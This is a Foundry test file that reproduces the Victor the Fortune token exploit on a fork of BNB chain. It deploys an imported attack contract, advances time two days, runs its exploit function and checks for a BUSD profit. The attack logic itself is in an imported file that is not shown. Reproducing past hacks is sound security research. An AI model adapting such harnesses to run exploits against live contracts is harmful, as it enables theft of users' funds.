// SPDX-License-Identifier:MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {VTFHack, IERC20} from "../../src/VTF/VTFHack.sol";

// Reproducing Victor the Fortune exploit in BNB chain
//https://twitter.com/peckshield/status/1585572694241988609?s=20&t=Ps0tyxN0heU66PgvxOJesg


contract VTFHackTest is Test {
    VTFHack vtfHack;
    IERC20 constant busd = IERC20(0x55d398326f99059fF775485246999027B3197955);

    function setUp() public {
        vm.createSelectFork("https://bsc-dataseed.binance.org/", 22394305);
        // This will also deploy the minicontracts
        console.log("Deploying factory contract..");
        console.log("Deploying minions aka mini Contracts..");
        vtfHack = new VTFHack();
    }

    function testExploit() public {
        // Move vm two days
        vm.warp(block.timestamp + 2 days);
        vtfHack.exploit();
        console.log("Total profit:", busd.balanceOf(address(this)));
        assert(busd.balanceOf(address(this)) > 0);
    }
}
